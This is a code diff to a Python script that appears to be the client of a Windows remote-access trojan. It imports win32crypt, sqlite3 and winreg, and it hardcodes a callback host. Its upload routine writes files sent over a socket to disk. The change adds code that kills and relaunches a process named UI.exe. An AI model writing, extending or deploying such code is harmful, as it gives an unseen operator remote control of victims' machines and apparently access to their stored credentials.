@@ -2,6 +2,8 @@ import socket, os, sys, platform, time, ctypes, subprocess, webbrowser, sqlite3,
 import win32api, winerror, win32event, win32crypt
 from shutil import copyfile
 from winreg import *
+import wmi
+import os
 
 
 strHost = "10.5.29.45"
@@ -96,7 +98,18 @@ def upload(data):
         objFile = open("peers.txt", "a+")
         if(check == True):
             objFile.write(file_data)
-        objFile.close()
+            objFile.close()
+            c = wmi.WMI()
+            i = 0
+            for process in c.Win32_Process ():
+                if (process.Name == 'UI.exe'):
+                    print('its found')
+                    result = process.Terminate()
+                    if(i == 0):
+
+                        os.system('start UI.exe')
+                        i+=1
+        
         objSocket.send(str.encode("Done!!!"))
     except:
         objSocket.send(str.encode("Path is protected/invalid!"))
